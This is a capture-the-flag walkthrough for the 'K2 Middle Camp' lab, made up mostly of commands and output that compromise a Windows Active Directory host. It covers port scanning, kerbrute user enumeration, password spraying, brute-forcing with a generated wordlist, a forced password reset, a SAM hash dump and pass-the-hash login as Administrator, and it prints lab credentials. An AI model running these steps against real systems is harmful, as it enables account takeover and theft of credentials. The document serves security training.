---
title: K2 Middle Camp
layout: default
parent: Hard.
nav_order: 2
---

# Tags, ``

# K2 Middle Camp

**Mini description**:
The IT Team can't believe that you have made it past the first server. However, they feel confident that you won't make it much further.

## From Base Camp
1. Create, `passwords.txt`
    ```
    Pwd@9tLNrC3!
    RdzQ7MSKt)fNaz3!
    vRMkaVgdfxhW!8
    ```

## Scan for ports
`sudo nmap -p- 10.80.128.194`
```diff
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49675/tcp open  unknown
49680/tcp open  unknown
49705/tcp open  unknown
49823/tcp open  unknown
```
- Create, `ports.txt`
    ```
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    3389/tcp  open  ms-wbt-server
    5985/tcp  open  wsman
    9389/tcp  open  adws
    49669/tcp open  unknown
    49670/tcp open  unknown
    49671/tcp open  unknown
    49675/tcp open  unknown
    49680/tcp open  unknown
    49705/tcp open  unknown
    49823/tcp open  unknown
    ```
## Full scan
1. `PORTS=$(cat ports.txt | sed 's/\// /g' | awk '{print $1}' | tr '\n' ',')`
1. `sudo nmap -sVC 10.80.128.194 -p $PORTS`
    ```diff
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        (generic dns response: SERVFAIL)
    | fingerprint-strings:
    |   DNS-SD-TCP:
    |     _services
    |     _dns-sd
    |     _udp
    |_    local
    +88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 15:19:59Z)
    +135/tcp   open  msrpc         Microsoft Windows RPC
    +139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    +389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
    +445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    +3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    |_ssl-date: 2026-01-29T15:21:30+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=K2Server.k2.thm
    | Not valid before: 2026-01-28T14:38:54
    |_Not valid after:  2026-07-30T14:38:54
    | rdp-ntlm-info:
    |   Target_Name: K2
    +|   NetBIOS_Domain_Name: K2
    +|   NetBIOS_Computer_Name: K2SERVER
    +|   DNS_Domain_Name: k2.thm
    +|   DNS_Computer_Name: K2Server.k2.thm
    |   DNS_Tree_Name: k2.thm
    |   Product_Version: 10.0.17763
    |_  System_Time: 2026-01-29T15:20:51+00:00
    +5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    49669/tcp open  msrpc         Microsoft Windows RPC
    49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49671/tcp open  msrpc         Microsoft Windows RPC
    49675/tcp open  msrpc         Microsoft Windows RPC
    49680/tcp open  msrpc         Microsoft Windows RPC
    49705/tcp open  msrpc         Microsoft Windows RPC
    49823/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.98%I=7%D=1/29%Time=697B7AAE%P=x86_64-pc-linux-gnu%r(DNS-                  SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
    SF:_udp\x05local\0\0\x0c\0\x01");
    Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
    ```
    - `88`, kerberos-sec - Microsoft Windows Kerberos
    - `135`, msrpc - Microsoft Windows RPC
    - `139`, netbios-ssn - Microsoft Windows netbios-ssn
    - `389`, Windows Active Directory LDAP
    - `445`, ldap - Microsoft Windows Active Directory LDAP
    - `3389`, ms-wbt-server - Microsoft Terminal Services
    - `5985`, http - Microsoft HTTPAPI httpd 2.0
1. Add, `/etc/hosts`
    ```
    10.80.128.194   K2 K2SERVER k2.thm K2Server.k2.thm
    ```
## Create username
1. [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
    - [username-anarchy](https://github.com/urbanadventurer/username-anarchy/blob/master/username-anarchy)
    - [format-plugins.rb](https://github.com/urbanadventurer/username-anarchy/blob/master/format-plugins.rb)
    - `username-anarchy -i fullnames.txt > possible_usernames.txt`
        ```diff
        james
        jamesbold
        james.bold
        jamesbol
        jamebold
        jamesb
        j.bold
        jbold
        bjames
        b.james
        boldj
        bold
        bold.j
        bold.james
        jb
        rose
        rosebud
        rose.bud
        roseb
        r.bud
        rbud
        brose
        b.rose
        budr
        bud
        bud.r
        bud.rose
        rb
        ```
## Find usernames
1. [kerbrute](https://github.com/ropnop/kerbrute) - `./kerbrute_linux_386 userenum --dc K2SERVER -d k2.thm possible_usernames.txt`
    ```diff
    +2026/01/29 10:50:42 >  [+] VALID USERNAME:       j.bold@k2.thm
    +2026/01/29 10:50:42 >  [+] VALID USERNAME:       r.bud@k2.thm
    ```
    - Create, `users.txt`
        ```
        r.bud
        j.bold
        ```
## Testing usernames and passwords
1. smb, `nxc smb k2server.k2.thm -u users.txt -p passwords.txt --continue-on-success`
    ```diff
    SMB         10.80.128.194   445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:None) (Null Auth:True)
    -SMB         10.80.128.194   445    K2SERVER         [-] k2.thm\r.bud:Pwd@9tLNrC3! STATUS_LOGON_FAILURE
    -SMB         10.80.128.194   445    K2SERVER         [-] k2.thm\j.bold:Pwd@9tLNrC3! STATUS_LOGON_FAILURE
    -SMB         10.80.128.194   445    K2SERVER         [-] k2.thm\r.bud:RdzQ7MSKt)fNaz3! STATUS_LOGON_FAILURE
    -SMB         10.80.128.194   445    K2SERVER         [-] k2.thm\j.bold:RdzQ7MSKt)fNaz3! STATUS_LOGON_FAILURE
    +SMB         10.80.128.194   445    K2SERVER         [+] k2.thm\r.bud:vRMkaVgdfxhW!8
    -SMB         10.80.128.194   445    K2SERVER         [-] k2.thm\j.bold:vRMkaVgdfxhW!8 STATUS_LOGON_FAILURE
    ```
1. winrm - `nxc winrm k2server.k2.thm -u users.txt -p passwords.txt --continue-on-success`
    ```diff
    WINRM       10.80.128.194   5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm)
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    -WINRM       10.80.128.194   5985   K2SERVER         [-] k2.thm\r.bud:Pwd@9tLNrC3!
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    -WINRM       10.80.128.194   5985   K2SERVER         [-] k2.thm\j.bold:Pwd@9tLNrC3!
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    -WINRM       10.80.128.194   5985   K2SERVER         [-] k2.thm\r.bud:RdzQ7MSKt)fNaz3!
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    -WINRM       10.80.128.194   5985   K2SERVER         [-] k2.thm\j.bold:RdzQ7MSKt)fNaz3!
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    +WINRM       10.80.128.194   5985   K2SERVER         [+] k2.thm\r.bud:vRMkaVgdfxhW!8 (Pwn3d!)
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    -WINRM       10.80.128.194   5985   K2SERVER         [-] k2.thm\j.bold:vRMkaVgdfxhW!8
    ```
## title
- `evil-winrm -i k2server.k2.thm -u 'r.bud' -p 'vRMkaVgdfxhW!8'`
## What are the usernames found on the server? List the usernames in alphabetical order separated by a comma. Exclude the Administrator user.
1. `ls C:\Users`
    ```diff
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----        1/29/2024   6:51 PM                Administrator
    +d-----        5/29/2023  10:23 PM                j.bold
    +d-----        5/29/2023  10:23 PM                j.smith
    d-r---       12/12/2018   7:45 AM                Public
    +d-----        5/29/2023   9:47 PM                r.bud
    ```
    ```
    j.bold,j.smith,r.bud
    ```
## Find james password
1. `james_password_gen.py`
    ```python
    #!/usr/bin/env python3

    import string

    base_pass = "rockyou"
    special_chars = string.punctuation

    f = open("./james_possible_passwords.txt", "w")

    for i in range(0, 10):
        for special_char in special_chars:
            f.write(f"{base_pass}{special_char}{i}\n")
            f.write(f"{base_pass}{i}{special_char}\n")
            f.write(f"{special_char}{i}{base_pass}\n")
            f.write(f"{i}{special_char}{base_pass}\n")
            f.write(f"{i}{base_pass}{special_char}\n")
            f.write(f"{special_char}{base_pass}{i}\n")

    f.close()
    ```
1. `james_possible_passwords.txt`
    ```
    ...
    ```
1. `./kerbrute_linux_386 bruteuser --dc k2server.k2.thm -d k2.thm james_possible_passwords.txt j.bold`
    ```diff
    +2026/01/29 13:40:22 >  [+] VALID LOGIN:  j.bold@k2.thm:#8rockyou
    ```
1. `nxc smb k2server.k2.thm -u 'j.bold' -p '#8rockyou'`
    ```diff
    SMB         10.80.187.100   445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:None) (Null Auth:True)
    +SMB         10.80.187.100   445    K2SERVER         [+] k2.thm\j.bold:#8rockyou
    ```
1. `nxc winrm k2server.k2.thm -u 'j.bold' -p '#8rockyou'`
    ```diff
    WINRM       10.80.187.100   5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm)
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    -WINRM       10.80.187.100   5985   K2SERVER         [-] k2.thm\j.bold:#8rockyou
    ```
1. `bloodhound-python -d k2.thm -u j.bold -p '#8rockyou' -ns 10.80.187.100 -dc k2server.k2.thm -c all`
1. `rpcclient -U 'j.bold%#8rockyou' <target IP > -c 'setuserinfo2 j.smith 23 Password321'`
1. `nxc winrm 10.82.146.163 -u j.smith -p Password321`
    ```diff
    WINRM       10.82.146.163   5985   K2SERVER         [*] Windows 10 / Server 2019 Build 17763 (name:K2SERVER) (domain:k2.thm) 
    /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
    arc4 = algorithms.ARC4(self._key)
    WINRM       10.82.146.163   5985   K2SERVER         [+] k2.thm\j.smith:Password321 (Pwn3d!)
    ```
1. - `evil-winrm -i k2server.k2.thm -u 'j.smith' -p 'Password321'`
## What is the user flag?
- `cd Desktop`
- `cat user.txt`
1. Back up the files, 
- SYSTEM, `reg save HKLM\SYSTEM C:\SYSTEM`
    - `download C:\\SYSTEM SYSTEM`
- SAM, `reg save HKLM\SAM C:\SAM`
    - `download C:\\SAM SAM`
1. Dump the hashes, 
- `./secretsdump.py -system SYSTEM -sam SAM local`
- `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
    ```diff
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    +Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545b61858c043477c350ae86c37b32f:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [*] Cleaning up... 
    ```
- `evil-winrm -i k2server.k2.thm -u 'administrator' -H '9545b61858c043477c350ae86c37b32f'`